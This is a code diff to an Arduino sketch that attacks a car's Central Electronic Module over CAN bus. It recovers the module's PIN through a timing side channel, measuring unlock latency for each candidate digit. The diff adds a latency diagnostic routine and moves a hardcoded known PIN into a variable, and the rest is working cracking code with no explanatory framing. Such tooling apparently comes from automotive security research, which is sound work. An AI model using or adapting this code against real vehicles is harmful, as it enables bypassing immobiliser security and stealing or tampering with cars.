@@ -2,10 +2,20 @@
 #include <mcp_can.h>
 #include <mcp_can_dfs.h>
 
+/* uncomment for latency diagnostics */
+//#define DIAG
+
 #define CAN_CS_PIN 27
 #define CAN_L_PIN  26
 #define PIN_LEN     6
-#define SAMPLES   3000
+
+#ifdef DIAG
+#define SAMPLES   300
+#else
+#define SAMPLES  3000
+#endif
+
+byte known_pin[PIN_LEN] = { 0x53, 0x38, 0x03, 0x21, 0x18, 0x02 }; // needed only for diagnostic
 
 MCP_CAN CAN(CAN_CS_PIN);
 
@@ -142,7 +152,50 @@ int cem_print_crack_rate()
   return rate;
 }
 
-//int sss[10][SAMPLES];
+int sss[10][SAMPLES];
+
+void cem_diag_latency()
+{
+  byte pin[PIN_LEN];
+  int i, j, k;
+  bool cp = cem_print;
+
+  cem_print = false;
+
+  memset (pin, 0, sizeof(pin));
+
+  for (i = 0; i < PIN_LEN; i++) {
+    for (j = 0; j < 10; j++) {
+      pin[i] = to_bcd((known_pin[i] >> 4) * 10 + j);
+      for (k = 0; k < SAMPLES; k++) {
+        int lat;
+        cem_unlock(pin, &lat, true);
+        sss[j][k] = lat;
+      }
+      qsort(sss[j], SAMPLES, sizeof(int), cem_max);
+    }
+    printf("\n# ");
+    for (int k = 0; k < PIN_LEN; k++) {
+      if (i == k)
+        printf("[ ");
+      printf("0x%02x ", pin[k]);
+      if (i == k)
+        printf("] ");
+    }
+
+    printf("\n");
+
+    for (k = 0; k < SAMPLES; k++) {
+      printf("%d ", k);
+      for (j = 0; j < 10; j++) {
+        printf("%d ", sss[j][k]);
+      }
+      printf("\n");
+    }
+    pin[i] = known_pin[i];
+  }
+  cp = cem_print;
+}
 
 void cem_crack_pin(int n)
 {
@@ -150,7 +203,6 @@ void cem_crack_pin(int n)
   float std_min = 0.0;
   int mean_max = 0;
   int df_max;
-  byte seq_[PIN_LEN] = { 0x53, 0x38, 0x03, 0x21, 0x18, 0x02 };
   byte seq[PIN_LEN] = { 0 };
   int i, j, k, q;
   int lat;
@@ -160,43 +212,15 @@ void cem_crack_pin(int n)
   int rate;
   int samples = SAMPLES / n;
   bool std_ext = false;
-  int start = 0;
+  int start = 0; // position to start with. copies first bytes from known_pin
 
   cem_print = false;
 again:
   memset (pin, 0, sizeof(pin));
   memset (seq, 0, sizeof(seq));
-  memcpy(seq, seq_, start);
-  memcpy(pin, seq_, start);
-/*
-  for (j = 0; j < 10; j++) {
-    seq[2] = to_bcd(j);
-    printf("> %d\n", j);
-    for (k = 0; k < SAMPLES; k++) {
-      int lat;
-      cem_unlock(seq, &lat, true);
-      sss[j][k] = lat;
-    }
-    qsort(sss[j], SAMPLES, sizeof(int), cem_max);
-  }
+  memcpy(seq, known_pin, start);
+  memcpy(pin, known_pin, start);
 
-  for (k = 0; k < SAMPLES; k++) {
-    printf("%d ", k);
-    for (j = 0; j < 10; j++) {
-      printf("%d ", sss[j][k]);
-    }
-    printf("\n");
-  }
-
-  for (j = 0; j < 10; j++) {
-    long df = 0;
-    for (k = SAMPLES * 2 / 10; k < SAMPLES * 3 / 10; k++) {
-      df += sss[j][k] - sss[j][k -1];
-    }
-    printf("%d df %d\n", j, df);
-  }  
-  return;
-*/
   for (i = start; i < n; i++) { /* for every byte in PIN besides last N*/
     mean_max = 0;
     std_min = 0.0;
@@ -387,7 +411,11 @@ void setup() {
 
   cem_read_serial_number();
 
+#ifdef DIAG
+  cem_diag_latency();
+#else
   cem_crack_pin(3);
+#endif
   cem_reset();
 }
 
